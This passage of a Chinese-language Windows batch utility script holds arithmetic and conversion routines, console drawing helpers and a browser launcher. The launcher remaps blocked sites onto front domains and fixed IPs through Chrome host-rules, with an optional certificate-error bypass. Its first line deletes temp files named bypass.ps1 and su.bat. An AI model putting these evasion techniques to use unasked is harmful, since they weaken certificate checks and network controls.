del %temp%\su.txt;%temp%\1.base;%temp%\2.base;%temp%\1.txt;%temp%\2.txt;%temp%\bypass.ps1;%temp%\su.bat
exit 0
:xdwjs
setlocal
set Bytes=%~1
set danwei=%~2
if /i "!danwei!" equ "kb" (set /a bytes*=1024)
if /i "!danwei!" equ "mb" (set /a bytes*=1048576)
if /i "!danwei!" equ "gb" (set /a bytes*=1073741824)
if "%~3" == "" Goto :eof
call :Division !Bytes! 1152921504606846976 2 OK
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% EB
	Goto :eof
) else (call :Division !Bytes! 1125899906842624 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% PB
	Goto :eof
) else (call :Division !Bytes! 1099511627776 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% TB
	Goto :eof
) else (call :Division !Bytes! 1073741824 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% GB
	Goto :eof
) else (call :Division !Bytes! 1048576 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% MB
	Goto :eof
) else (call :Division !Bytes! 1024 2 OK)
if not "%OK:~0,2%"=="0." (
	endlocal&set %~3=%OK% KB
	Goto :eof
) else (
	endlocal&set %~3=%Bytes% Byte
	Goto :eof
)
:Division
setlocal
if "%~4" == "" Goto :eof
set Div.1=%~1
set Div.2=%~2
set Div.3=
set Div.I=0
set Div.D=%~3
set Div.1.Len.0=
set Div.2.Len.0=
set Div.Z=00000000
for /l %%i in (1 1 9) do set Div.Num.%%i=
for /l %%i in (1 1 7) do set Div.Z=!Div.Z!!Div.Z!
set Div.H=4096 2048 1024 512 256 128 64 32 16 8 4 2 1
for /l %%i in (1 1 2) do (
	set Div.N=0
	set Div.%%i.Len.2=0
	for %%j in (!Div.%%i:.^= !) do (
		set /a Div.N+=1
		set Div.M=Div.M%%j
		set Div.%%i.Len.!Div.N!=0
		for %%l in (!Div.H!) do (
			if "!Div.M:~%%l!" neq "" (
				set /a Div.%%i.Len.!Div.N!+=%%l
				set Div.M=!Div.M:~%%l!
			)
		)
		set /a Div.%%i.Len.0+=Div.%%i.Len.!Div.N!
	)
        set Div.%%i=!Div.%%i:.=!
)
if !Div.1.Len.2! gtr !Div.2.Len.2! (
	set /a Div.2.Len.0+=Div.1.Len.2-Div.2.Len.2
	) else (
		set /a Div.1.Len.0+=Div.2.Len.2-Div.1.Len.2
)
for /l %%i in (1 1 2) do (
	set Div.%%i=!Div.%%i!!Div.Z!
	for %%j in (!Div.%%i.Len.0!) do set Div.%%i=!Div.%%i:~,%%j!
)
for /f "tokens=* delims=0" %%i in ("!Div.2!") do (
	set Div.O=%%i
	set Div.2=0%%i
)
set Div.2.Len.0=1
for %%i in (!Div.H!) do (
	if "!Div.O:~%%i!" neq "" (
		set /a Div.2.Len.0+=%%i
		set Div.O=!Div.O:~%%i!
	)
)
set /a Div.Len=Div.2.Len.0+1
if !Div.1.Len.0! lss !Div.2.Len.0! (
	set Div.1.Len.0=!Div.2.Len.0!
	set Div.1=!Div.Z:~-%Div.2.Len.0%,-%Div.1.Len.0%!!Div.1!
)
set /a Div.1.Len.0+=Div.D
set Div.1=0!Div.1!!Div.Z:~,%Div.D%!
set Div.P=!Div.1:~,%Div.2.Len.0%!
set Div.T=0000000!Div.2!
set /a Div.J+=1
set /a Div.Tem.Len=Div.2.Len.0+7
if !Div.J! equ 1 (for %%i in (!1:~-1!) do (
	for /f "delims=" %%j in ("!%%i!") do (
		if %%~Zj equ !%Div.I%! set C=!Div.D!
		)
	)
)
for /l %%i in (1 1 9) do (
	set Div.V=0
	for /l %%j in (8 8 !Div.Tem.Len!) do (
		set /a Div.V=1!Div.T:~-%%j,8!*%%i+Div.V
        	set Div.Num.%%i=!Div.V:~-8!!Div.Num.%%i!
		set /a Div.V=!Div.V:~,-8!-%%i
	)
	set Div.Num.%%i=!Div.V!!Div.Num.%%i!
	set Div.Num.%%i=0000000!Div.Num.%%i:~-%Div.Len%!
)
for /l %%l in (!Div.2.Len.0! 1 !Div.1.Len.0!) do (
	set Div.P=!Div.Z!!Div.P!!Div.1:~%%l,1!
	set Div.P=!Div.P:~-%Div.Len%!
	if !Div.J! equ 1 (
		set Div.I.Tem=
		for %%i in (!%Div.I%!) do set Div.D.Tem=%%i
		for /l %%i in (0 1 9) do set Div.D.Tem=!Div.D.Tem:%%i=%%i !
		for %%i in (!Div.D.Tem!) do set /a Div.I.Tem=!Div.I.Tem!+%%i
		if !Div.I.Tem! neq 24 set C=
	)
	if "!Div.P!" geq "!Div.2!" (
		set Div.R=1
		set Div.S=0000000!Div.P!
		for /l %%i in (2 1 9) do (
			if "!Div.S!" geq "!Div.Num.%%i!" set Div.R=%%i
		)
		set Div.3=!Div.3!!Div.R!
		set Div.P=
		set Div.V=0
		for %%i in (!Div.R!) do (
			for /l %%j in (8 8 !Div.Tem.Len!) do (
				set /a Div.V=3!Div.S:~-%%j,8!-1!Div.Num.%%i:~-%%j,8!-!Div.V:~,1!%%2
				set Div.P=!Div.V:~1!!Div.P!
              		 )
		)	
	) else set Div.3=!Div.3!0
)
if defined Div.D if %Div.D% gtr 0 set Div.3=!Div.3:~,-%Div.D%!.!Div.3:~-%Div.D%!
for /f "tokens=* delims=0" %%i in ("!Div.3!") do set Div.3=%%i
if "!Div.3:~0,1!"=="." set Div.3=0!Div.3!
if "!Div.3!"=="" set Div.3=0
endlocal&set %~4=%Div.3%
goto :eof
:xsjc
setlocal
set /a N=0
for /f "tokens=1-8 delims=.:" %%I in ("%~2:%~1") do (
	set /a N+=10%%I%%100*360000+10%%J%%100*6000+10%%K%%100*100+10%%L%%100
	set /a N-=10%%M%%100*360000+10%%N%%100*6000+10%%O%%100*100+10%%P%%100
)
set Sco=!N!
set /a S=N/360000,N=N%%360000,F=N/6000,N=N%%6000,M=N/100,N=N*%%100
set /a n*=10
if %F% equ 0 (set T=%M%秒%N%毫秒) else set T=%F%分%M%秒%N%毫秒
if %s% neq 0 set t=%s%小时%F%分%M%秒%N%毫秒
endlocal&set %~3=%T%
Goto :eof
:cf
setlocal
call :cf_1 %1 %2 %3 jg
endlocal&set %4=%jg%
goto :eof
:cf_1
set num=0
set dec_str=
set input=
if "%~4" equ "" (goto :eof)
set /a int_str=%1/%2
set /a mod=%1%%%2
if %mod% equ 0 goto end
:count_dec
set mod=%mod%0
if %mod% lss %2 (
    set dec_str=!dec_str!0
    goto count_dec
) else (
    set /a dec=%mod%/%2
    set dec_str=!dec_str!!dec!
    set /a mod=%mod%%%%2
)
set /a num+=1
if %mod% neq 0 if %num% lss %3 goto count_dec
:end
for /l %%i in (1,1,%3) do set zero_str=!zero_str!0
set dec_str=%dec_str%%zero_str%
set %~4=%int_str%.!dec_str:~0,%3!
goto :eof
:add
(set L=&for /l %%a in (1,1,8) do set L=!L!00000000
for /f "tokens=1-3 delims=." %%a in ("!L!%1.!L!") do set at=%%a&set aw=%%b%%c
for /f "tokens=1-3 delims=." %%a in ("!L!%2.!L!") do set bt=%%a&set bw=%%b%%c
set a=!at:~-64!!aw:~,64!&set b=!bt:~-64!!bw:~,64!&set e=&set v=200000000
for /l %%a in (8,8,128)do set/a v=1!b:~-%%a,8!+1!a:~-%%a,8!+!v:~-9,-8!-2&set e=!v:~-8!!e!
set e=!e:0= !&for /f "tokens=*" %%a in ("!e:~,-64!_.!e:~64!") do set e=%%~nxa
set e=!e:_=!&for %%a in ("!e: =0!") do endlocal&(if %3.==. (echo %%~a) else set %3=%%~a)
goto :eof)
:offdisplay
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
goto :eof
:choice
choice /c !cho! /n /m 请输入你的选择:
set shuru=!errorlevel!
goto :eof
:bk
setlocal
set cs=0
for /f "delims=: skip=2 tokens=2" %%a in ('"mode con"') do (
	set /a cs+=1
	if !cs! equ 1 (
		set h=%%a
	)
	if !cs! equ 2 (
		set l=%%a
	)
)
set /a h_1=h-1
set /a l_1=l-1
set /a l_4=l-4
for /l %%a in (0,1,!l_4!) do (
	set fh=!fh!-
)
set fh=+!fh!+
set /p =!cswz!1;1H!fh!<nul
for /l %%a in (2,1,!h_1!) do (
	set /p =!cswz!%%a;1H^|!cswz!%%a;!l_1!H^|<nul
)
set /p =!cswz!!h_1!;1H!fh!<nul
goto :eof
:fk
setlocal
set h=%1
set l=%2
set /a h1=h+1
set /a l1=%4-2
set /a h2=h+%3-2
set /a l2=l+%4-1
set /a h3=h+%3-1
for /l %%a in (1,1,!l1!) do (
	set fh=!fh!-
)
set fh=+!fh!+
set /p =!cswz!!h!;!l!H!fh!<nul
for /l %%a in (!h1!,1,!h2!) do (
	set /p =!cswz!%%a;!l!H^|!cswz!%%a;!l2!H^|<nul
)
set /p =!cswz!!h3!;!l!H!fh!<nul
goto :eof
:hx
setlocal
set h=%1
set l=%2
set /a cd=%3-2
for /l %%a in (1,1,!cd!) do (
	set fh=!fh!-
)
set fh=+!fh!+
set /p =!cswz!!h!;!l!H!fh!<nul
goto :eof
:sx
setlocal
set h=%1
set l=%2
set /a h1=h+1
set /a h2=h+%3-1
set /a cd=%3+h-2
set /p =!cswz!!h!;!l!H+<nul
for /l %%a in (!h1!,1,!cd!) do (
	set /p =!cswz!%%a;!l!H^|<nul
)
set /p =!cswz!!h2!;!l!H+<nul
goto :eof
:00
exit 0
:73
:chrome
@echo off&setlocal enabledelayedexpansion&chcp 936>nul
set "域名重定向=!temp!\域名重定向.txt"
set "域名重解析=!temp!\域名重解析.txt"
set "强制使用quic=!temp!\强制使用quic.txt"
if not exist "!域名重定向!" (
	(
		echo #wikipedia
		echo *.wikipedia.org=wikidata.org
		echo *.wikiquote.org=wikidata.org
		echo *.wikinews.org=wikidata.org
		echo;
		echo #pixiv
		echo pixiv.net=fastly.com
		echo *.pixiv.net=fastly.com
		echo *.pximg.net=pximg.net
		echo;
		echo #reddit
		echo reddit.com=github.githubassets.com
		echo *.reddit.com=github.githubassets.com
		echo *.redd.it=github.githubassets.com
		echo *.redditmedia.com=github.githubassets.com
		echo;
		echo #protonmail
		echo proton.me=pr.tn
		echo account.proton.me=a.pr.tn
		echo account-api.proton.me=b.pr.tn
		echo mail.proton.me=c.pr.tn
		echo;
		echo #youtube
		echo *.youtube.com=google-analytics.com
		echo *.ytimg.com=googleadservices.com
		echo *.ggpht.com=googleads.g.doubleclick.net
		echo youtube.com=static.doubleclick.net
		echo youtu.be=mt7.gstatic.com
		echo;
		echo #google
		echo *.google.com=googleadservices.com
		echo *.google.com.hk=googleadservices.com
		echo *.google.com.tw=googleadservices.com
		echo *.googleapis.com=googleads.g.doubleclick.net
		echo *.googleusercontent.com=static.doubleclick.net
		echo *.gstatic.com=alt6.gstatic.com
		echo *.cloudfunctions.net=alt6.gstatic.com
		echo *.blogspot.com=google-analytics.com
		echo;
		echo #github
		echo github.com=octocaptcha.com
		echo *.github.com=octocaptcha.com
		echo *.githubusercontent.com=fastly.com
		echo *.githubassets.com=fastly.com
		echo *.github.io=octocaptcha.com
		echo;
		echo #steam
		echo login.steampowered.com=login.steampowered.com
		echo help.steampowered.com=help.steampowered.com
		echo *.steampowered.com=steamuserimages-a.akamaihd.net
		echo steamcommunity.com=underlords.com
		echo *.steamcommunity.com=underlords.com
		echo;
		echo #onedrive
		echo onedrive.live.com=od0.live.com
		echo skyapi.onedrive.live.com=storage.live.com
		echo;
		echo #nyaa
		echo nyaa.si=nyaa.ddos-guard.net
		echo;
		echo #imgur
		echo imgur.com=fastly.com
		echo *.imgur.com=github.githubassets.com
		echo;
		echo #vercel.app
		echo vercel.app=no-sni.vercel-infra.com
		echo *.vercel.app=no-sni.vercel-infra.com
		echo;
		echo #twimg
		echo *.twimg.com=fastly.com
		echo;
		echo #lain.la
		echo *.lain.la=lain.la
		echo;
	)>"!域名重定向!"
)
if not exist "!域名重解析!" (
	(
		echo #wikipedia
		echo #wikidata.org=[2620:0:863:ed1a::1]
		echo wikidata.org=208.80.153.224
		echo;
		echo #protonmail
		echo pr.tn=185.70.42.45
		echo a.pr.tn=185.70.42.36
		echo b.pr.tn=185.70.42.20
		echo c.pr.tn=185.70.42.37
		echo;
		echo #youtube google
		echo #mt7.gstatic.com=[2404:6800:4008:c01::5a]
		echo mt7.gstatic.com=216.239.32.40
		echo #alt6.gstatic.com=[2404:6800:4008:c01::5a]
		echo alt6.gstatic.com=216.239.32.40
		echo #google-analytics.com=[2404:6800:4008:c01::5a]
		echo google-analytics.com=216.239.32.40
		echo #googleadservices.com=[2404:6800:4008:c01::5a]
		echo googleadservices.com=216.239.32.40
		echo #googleads.g.doubleclick.net=[2404:6800:4008:c01::5a]
		echo googleads.g.doubleclick.net=216.239.32.40
		echo #static.doubleclick.net=[2404:6800:4008:c01::5a]
		echo static.doubleclick.net=216.239.32.40
		echo;
		echo #nyaa
		echo nyaa.ddos-guard.net=186.2.163.20
		echo;
	)>"!域名重解析!"
)
if not exist "!强制使用quic!" (
	(
		echo #不支持通配符
		echo www.google.com.hk
		echo www.google.com.tw
		echo www.google.com
		echo www.quora.com
		echo quora.com
		echo qsbr.cf2.quoracdn.net
		echo v2ex.com
		echo cdn.v2ex.com
		echo www.v2ex.com
		echo challenges.cloudflare.com
		echo www.openstreetmap.org
		echo tile.openstreetmap.org
		echo ipfs.io
		echo cloudflare-ipfs.com
		echo;
	)>"!强制使用quic!"
)
cd /d %~dp0
rem 忽略证书错误 0=禁用 1=启用
set "pass_cert_error=0"
rem 设置支持chrome命令行的浏览器的路径
set "chromium="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
if "!pass_cert_error!" equ "1" (
	set "ignore-certificate-errors=--ignore-certificate-errors"
)
if exist "chrome.exe" (
	set "chrome=chrome.exe"
	goto startchrome
) else (
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /v Path 2>nul"') do (
		set "chrome=%%a"
	)
	for /f "delims=" %%a in ("!chrome!") do (
		set "chrome=%%~fa"
	)
	if exist "!chrome!\Chrome.exe" (
		set "chrome=!chrome!\Chrome.exe"
		goto startchrome
	) else (
		for /f "delims=" %%a in ("!chromium!") do (
			set "chrome=%%~fa"
		)
		if exist "!chrome!" (
			goto startchrome
		) else (
			msg %username% 没有找到浏览器路径
			exit 0
		)
	)
)
:startchrome
for /f "delims=" %%a in ("!chrome!") do (
	tasklist /fi "IMAGENAME eq %%~nxa"|findstr /i /c:"%%~nxa">nul
	if "!errorlevel!" equ "0" (
		cls
		echo;%%~nxa正在运行,请关闭浏览器后重试.
		set /p =按任意键退出<nul&pause>nul
		if "%1" neq "-chrome" (
			goto memuv2
		) else (
			goto :eof
		)
	)
)
if exist "!域名重定向!" (
	for /f "eol=# tokens=1,2 delims== " %%a in (!域名重定向!) do (
		set "host-rules=!host-rules!MAP %%a %%b, "
	)
	set "host-rules=--host-rules="!host-rules!""
)
if exist "!域名重解析!" (
	for /f "eol=# tokens=1,2 delims== " %%a in (!域名重解析!) do (
		set "host-resolver-rules=!host-resolver-rules!MAP %%a %%b, "
	)
	set "host-resolver-rules=--host-resolver-rules="!host-resolver-rules!""
)
if exist "!强制使用quic!" (
	for /f "eol=# tokens=1,2 delims=:" %%a in (!强制使用quic!) do (
		if "%%b" equ "" (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:443, "
		) else (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:%%b, "
		)
	)
	set "origin-to-force-quic-on=--origin-to-force-quic-on="!origin-to-force-quic-on!""
)
start /max "" "!chrome!" --profile-directory=Default --test-type !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors! %2
if "%1" neq "-chrome" (
	goto memuv2
) else (
	goto :eof
)
:checkvar
setlocal
if "%1" equ "" (
	goto :eof
) else (
	set "val=!%1!"
)
if "%2" equ "num" (
	goto checkvar_num
)
if "%2" equ "num." (
	goto checkvar_num.
)
if "%2" equ "-num" (
	goto checkvar_-num
)
if "%2" equ "-num." (
	goto checkvar_-num.
)
if "%2" equ "az" (
	goto checkvar_az
)
if "%2" equ "aznum" (
	goto checkvar_aznum
)
goto :eof
:checkvar_num
if defined %1 (
	for /f "delims=0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=1"
	goto :eof
) else (
	echo;1
	goto :eof
)
goto :eof
:checkvar_num.
if defined %1 (
	for /f "delims=.0123456789" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1,2 delims=." %%a in ("!%1!") do (
	if "%%a" neq "" (
		set "val1=%%a"
	) else (
		set "val1=0"
	)
	if "%%b" neq "" (
		set "val2=%%b"
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
if "!val1!!val2!" neq "" (
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
goto :eof
:checkvar_-num
if defined %1 (
	for /f "delims=0123456789-" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
) else (
	if "%3" neq "" (
		endlocal&set "%3=0"
		goto :eof
	) else (
		echo;0
		goto :eof
	)
)
for /f "tokens=1 delims=-" %%a in ("!%1!") do (
	if "!%1:~0,1!" equ "-" (
		if "%3" neq "" (
			endlocal&set "%3=1"
			goto :eof
		) else (
			echo;1
			goto :eof
		)
	) else (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
)
goto :eof
:checkvar_-num.
set "val1=!val:~1!"
set "val2=!val:.=!"
if defined val1 (
	call :checkvar val1 num. jg
	if "!jg!" equ "1" (
		call :checkvar val2 -num jg
		if "!jg!" equ "1" (
			if "%3" neq "" (
				endlocal&set "%3=1"
				goto :eof
			) else (
				echo;1
				goto :eof
			)
		)
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)
goto :eof
:checkvar_az
if defined %1 (
	for /f "delims=abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
goto :eof
:checkvar_aznum
if defined %1 (
	for /f "delims=0123456789abcdefghijklmnopqrstuvwxyz" %%a in ("!%1!") do (
		if "%3" neq "" (
			endlocal&set "%3=0"
			goto :eof
		) else (
			echo;0
			goto :eof
		)
	)
	if "%3" neq "" (
		endlocal&set "%3=1"
		goto :eof
	) else (
		echo;1
		goto :eof
	)
)
if "%3" neq "" (
	endlocal&set "%3=0"
	goto :eof
) else (
	echo;0
	goto :eof
)

goto :eof
:sqrt
setlocal
set s=%1
set w=%2
if defined W (for /l %%i in (1 1 %W%) do set "s=!s!00") else set W=0
set p=!s!&set /a len=N=0
for %%i in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do IF "!p:~%%i!" NEQ "" set/a len+=%%i&set "p=!p:~%%i!"
set /a "N-=~(len%%2)"
set M=!s:~,%N%!
for /l %%i in (1 1 9) do set/a Mx=%%i*%%i&if !Mx! leq !M! set/a "i=%%i,j=100+M-Mx"
set /a "len-=1,Len_i=_N=i/5+1,p=i*20"
set j=!j:~-%_N%!&set p=0!p!&set kl=0000000
set /a _N=8-_N
for /l %%i in (%N% 2 !len!) do (
set "j=!j!!s:~%%i,2!"
if "!j:0=!" neq "" (
set /a Ln_i=Len_i+=2
if "!p!" lss "!j!" (
set d=Z&set in=!kl!!P!&set /a Ln_i+=7
for /l %%j in (9 -1 2) do (
if "!d!" gtr "!j!" (
set "x=%%j"
set d=&set /a "b=x*x"
for /l %%k in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%k,8!*%%j+b"
set d=!b:~-8!!d!&set /a "b=!b:~,-8!-%%j"
)
set d=!b!!d!
for %%k in (!Len_i!) do set "d=!d:~-%%k!"
)
)
if "!d!" gtr "!j!" (set d=!in!&set x=1&set b=1) else set d=!kl!!d!&set b=0
set j=!kl!!j!&set "t="
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=3!j:~-%%j,8!-1!d:~-%%j,8!-!b:~,1!%%2"
set "t=!b:~1!!t!"
)
for %%j in (!Len_i!) do set "j=!t:~-%%j!"
set "j=!j:~1!" ) else set "x=0"
set /a "Len_i-=1"
if "!x!" neq "0" (
if "!x!" geq "5" (
set p=&set b=0&set "in=!kl!!i!!x!"
set /a "Ln_i=Len_i+_N"
for /l %%j in (8 8 !Ln_i!) do (
set /a "b=1!in:~-%%j,8!*2+!b:~,1!%%2"
set p=!b:~1!!p!
)
set /a "b=!b:~,1!%%2"
for %%j in (!Len_i!) do set "p=!b:1=01!!p:~-%%j!0"
) else set /a t=x*2&set "p=!p:~,-1!!t!0"
) else set p=!p!0&set "j=!j:~1!"
) else set j=!j:~1!&set p=!p!0&set /a "Len_i+=1,x=0"
set i=!i!!x!
)
for /f "tokens=* delims=." %%i in ("!i:~,-%W%!.!i:~-%W%!") do (endlocal&set %3=%%i)
goto :eof
:10to16
(setlocal
set "ran=%1"
:10to16_1
set /a "s=!ran!%%16"
if !s! lss 10 goto 10to16_3
if !s! gtr 12 goto 10to16_2
if "!s!" equ "10" set "s=A"&goto 10to16_3
if "!s!" equ "11" set "s=B"&goto 10to16_3
if "!s!" equ "12" set "s=C"&goto 10to16_3
:10to16_2
if "!s!" equ "13" set "s=D"&goto 10to16_3
if "!s!" equ "14" set "s=E"&goto 10to16_3
if "!s!" equ "15" set "s=F"&goto 10to16_3
:10to16_3
set "jg=!s!!jg!"
set /a "ran/=16"
if !ran! neq 0 goto 10to16_1
if "%2" neq "" (
	endlocal&set "%2=%jg%"
) else (
	endlocal&echo %jg%
)
goto :eof
)
:10to2
(setlocal
set "num=%1"
:10to2_1
set /a "e=num%%2"
set /a "num/=2"
set "num1=!e!!num1!"
if !num! neq 0 goto 10to2_1
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo %num1%
)
goto :eof
)
:10to8
(setlocal
set "num=%1"
:10to8_2
set /a "b=num%%8"
set /a "num/=8"
set "num1=!b!!num1!"
if !num! neq 0 goto 10to8_2
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	endlocal&echo %num1%
)
goto :eof
)
:2to10
(setlocal
set nn=
set "nnn=1"
set "n=%1"
set "n=!n:0= 0!"
set "n=!n:1= 1!"
for %%a in (!n!) do (
	set "nn=%%a !nn!"
)
for %%a in (!nn!) do (
	set /a "num+=%%a*nnn,nnn*=2"
)
if "%2" neq "" (
	endlocal&set "%2=%num%"
) else (
	endlocal&echo %num%
)
goto :eof
)
:calc
set a=%~1.0
set b=%~3.0
for /f "tokens=1,2 delims=." %%a in ("%a:-=%") do set "a_1=%%a"&set "a_2=%%b"
for /f "tokens=1,2 delims=." %%a in ("%b:-=%") do set "b_1=%%a"&set "b_2=%%b"
call :strlenx %a_1% L1_1
call :strlenx %a_2% L1_2
call :strlenx %b_1% L2_1
call :strlenx %b_2% L2_2
for %%i in (1 2) do (
    set "zero="&set m=0
    if !L1_%%i! leq !L2_%%i! (
        set /a m=L2_%%i-L1_%%i
        if !m! neq 0 (
            for /l %%a in (1 1 !m!) do set zero=!zero!0
        )
        if "%%i" equ "1" (set a_%%i=!zero!!a_%%i!) else set a_%%i=!a_%%i!!zero!
        set Len_%%i=!L2_%%i!
    ) else (
        set /a m=L1_%%i-L2_%%i
        for /l %%a in (1 1 !m!) do set zero=!zero!0
        if "%%i" equ "1" (set b_%%i=!zero!!b_%%i!) else set b_%%i=!b_%%i!!zero!
        set Len_%%i=!L1_%%i!
    )
)
set /a Len=Len_1+Len_2+1
if "%~2" equ "+" (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
        ) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
        )
    ) else (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" gtr "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
        ) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
        )
    )
) else (
    if "!a:~,1!" neq "-" (
        if "!b:~,1!" neq "-" (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=-!s!") else set "%~4=!s!"
        ) else (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=!s!"
        )
    ) else (
        if "!b:~,1!" neq "-" (
            call :jia %a_1%.%a_2% %b_1%.%b_2% %Len% s
            set "%~4=-!s!"
        ) else (
            call :jian %a_1%.%a_2% %b_1%.%b_2% %Len% s
            if "%a_1%.%a_2%" lss "%b_1%.%b_2%" (set "%~4=!s!") else set "%~4=-!s!"
        )
    )
)
goto :eof
:strlenx
setlocal
set "$=%1#"
set len=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. neq . set/a len+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/a len+=0x!$:~16,1!
endlocal&set %2=%len%&goto :eof
:jia
setlocal
set a=%~1
set b=%~2
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
    ) else (
        set /a "c=t+!a:~%%a,1!+!b:~%%a,1!"
        if !c! geq 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
    )
)
if %t% equ 1 (set s=1!s!)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=1* delims=0" %%c in (".%%b") do if "%%c%%d" equ "." set s=%%a
)
endlocal&set %~4=%s%&goto :eof
:jian
setlocal
if "%~1" lss "%~2" (
    set a=%~2
    set b=%~1
) else (
    set a=%~1
    set b=%~2
)
set t=0
set "s="
for /l %%a in (-1 -1 -%~3) do (
    if "!a:~%%a,1!" equ "." (
      set s=.!s!
    ) else (
        set /a "c=10+!a:~%%a,1!-!b:~%%a,1!-t"
        if !c! lss 10 (set t=1) else set t=0
        set s=!c:~-1!!s!
    )
)
for /f "tokens=1,2 delims=." %%a in ("%s%") do (
    for /f "tokens=* delims=0" %%c in ("%%a") do if "%%c" equ "" (set pre=0) else set pre=%%c
    for /f "tokens=* delims=0" %%c in ("%%b") do if "%%c" equ "" (set s=!pre!) else set s=!pre!.%%b
)
endlocal&set %~4=%s%&goto :eof
:pdxp
set zmlj=%zmlj:~19%\
if /i "!system!" equ "Microsoft Windows XP Home" (set system= - Windows XP 家庭版)
if /i "!system!" equ "Microsoft Windows XP Professional" (set system= - Windows XP 专业版)
goto :eof
:pd7
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 7 Ultimate" (set system= - Windows 7 旗舰版)
if /i "!system!" equ "Microsoft Windows 7 Home Basic" (set system= - Windows 7 家庭普通版)
if /i "!system!" equ "Microsoft Windows 7 Home Premium" (set system= - Windows 7 家庭高级版)
if /i "!system!" equ "Microsoft Windows 7 Professional" (set system= - Windows 7 专业版)
if /i "!system!" equ "Microsoft Windows 7 Enterprise" (set system= - Windows 7 企业版)
goto :eof
:pd8
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 8 Pro" (set system= - Windows 8 专业版)
if /i "!system!" equ "Microsoft Windows 8 China" (set system= - Windows 8 中国版)
if /i "!system!" equ "Microsoft Windows 8 Enterprise" (set system= - Windows 8 企业版)
goto :eof
:pd8.1
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 8.1 Pro" (set system= - Windows 8.1 专业版)
if /i "!system!" equ "Microsoft Windows 8.1 China" (set system= - Windows 8.1 中国版)
if /i "!system!" equ "Microsoft Windows 8.1 Enterprise" (set system= - Windows 8.1 企业版)
goto :eof
:pd10
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 10 Home" (set system= - Windows 10 家庭版)
if /i "!system!" equ "Microsoft Windows 10 Professional" (set system= - Windows 10 专业版)
if /i "!system!" equ "Microsoft Windows 10 Education" (set system= - Windows 10 教育版)
if /i "!system!" equ "Microsoft Windows 10 Enterprise" (set system= - Windows 10 企业版)
goto :eof
:pd11
set zmlj=%zmlj:~25%\
if /i "!system!" equ "Microsoft Windows 11 Home" (set system= - Windows 11 家庭版)
if /i "!system!" equ "Microsoft Windows 11 Professional" (set system= - Windows 11 专业版)
if /i "!system!" equ "Microsoft Windows 11 Education" (set system= - Windows 11 教育版)
if /i "!system!" equ "Microsoft Windows 11 Enterprise" (set system= - Windows 11 企业版)
goto :eof
:sortaz
setlocal
